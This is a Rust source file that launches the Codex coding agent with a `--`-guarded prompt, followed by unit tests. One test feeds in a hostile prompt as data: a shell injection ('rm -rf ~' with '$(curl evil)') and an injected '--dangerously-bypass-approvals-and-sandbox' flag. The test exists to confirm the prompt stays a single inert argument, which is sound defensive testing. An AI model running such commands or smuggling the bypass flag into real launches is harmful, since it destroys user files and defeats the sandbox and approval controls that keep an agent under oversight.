//! Codex harness: runs `codex -- <prompt>` in the tab. Codex has no thread-title
//! flag, so the prompt rides as a single `--`-guarded positional with no `--name`.

use super::{AgentLauncher, argv::LaunchArgv};
use crate::engines::pending_work::{
    launch::{Worktree, new_launch_prompt},
    model::Item,
};

const BINARY: &str = "codex";

/// Launches Codex (`codex -- <prompt>`) with the item's launch prompt.
pub(in crate::engines::pending_work) struct CodexLauncher;

impl AgentLauncher for CodexLauncher {
    fn binary(&self) -> &str {
        BINARY
    }

    fn argv(&self, item: &Item, worktree: Worktree) -> Vec<String> {
        LaunchArgv::new(BINARY).into_guarded(new_launch_prompt(item, worktree))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn binary_is_codex() {
        assert_eq!(CodexLauncher.binary(), "codex");
    }

    #[test]
    fn builds_guarded_argv_no_name() {
        let item = Item {
            prompt: "do the thing".to_string(),
            ..Item::default_for_test("PWF-0068", "codex dispatch")
        };
        let argv = CodexLauncher.argv(&item, Worktree::from(false));
        assert_eq!(argv[0], "codex");
        // No `--name`: codex has no thread-title flag. The `--` guard precedes the prompt.
        assert_eq!(argv[1], "--");
        assert!(argv[2].contains("do the thing"));
        assert_eq!(argv.len(), 3);
    }

    #[test]
    fn hostile_prompt_stays_single_inert_element() {
        // Store data is arbitrary/hostile: it must never become a flag or split across
        // argv elements. argv[0] is fixed; the `--` guard caps options.
        let item = Item {
            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox"
                .to_string(),
            ..Item::default_for_test("PWF-0068", "hostile")
        };
        let argv = CodexLauncher.argv(&item, Worktree::from(false));
        assert_eq!(argv[0], "codex"); // store can't change WHAT runs
        assert_eq!(argv[1], "--"); // guard present
        assert_eq!(argv.len(), 3); // prompt is exactly one trailing element
        assert!(argv[2].contains("rm -rf"));
        assert!(argv[2].contains("--dangerously-bypass-approvals-and-sandbox"));
    }
}
